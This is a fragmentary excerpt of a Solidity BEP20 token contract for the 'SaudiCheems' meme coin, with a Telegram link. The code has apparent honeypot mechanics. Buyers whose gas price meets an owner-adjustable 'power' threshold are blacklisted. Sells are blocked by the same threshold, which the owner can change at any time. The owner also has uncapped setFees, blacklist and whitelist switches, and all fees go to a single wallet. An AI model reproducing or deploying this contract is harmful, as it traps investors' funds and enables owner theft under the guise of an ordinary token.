...
Saudi Cheems - The Eternal King of Saudi Arabia

Telegram:   https://t.me/Saudi_cheems
...
contract SaudiCheems is Ownable, IBEP20 {
    ...
    string  _name = "SaudiCheems";
    string  _symbol = "SAUDICHEEMS";
    ...
    uint256 public totalFee        = marketingFee + liquidityFee + teamFee + burnFee + devFee;
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x5Dd5a6222eC7e07A2d41C75D34d0510693D33D2E;
        teamFeeReceiver = 0x5Dd5a6222eC7e07A2d41C75D34d0510693D33D2E;
        devFeeReceiver = 0x5Dd5a6222eC7e07A2d41C75D34d0510693D33D2E;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= power && recipient != pair) {
            isblacklisted[recipient] = true;
        }

        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= power, ">Sell on wallet action"); 
        }
    ...
    function updatePower(uint256 _power) public onlyOwner {
        power = _power * 1 gwei; 
    }
    ...
    function enable_blacklist(bool _status) public onlyOwner {
     ...
     function enable_cleanMode(bool _status) public onlyOwner {
        cleanMode = _status;
    }
    ...
    function manage_isClean(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isClean[addresses[i]] = status;
        }
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;        
        teamFee = _teamFee;
        devFee = _devFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee + _marketingFee + _teamFee + _burnFee + _devFee;
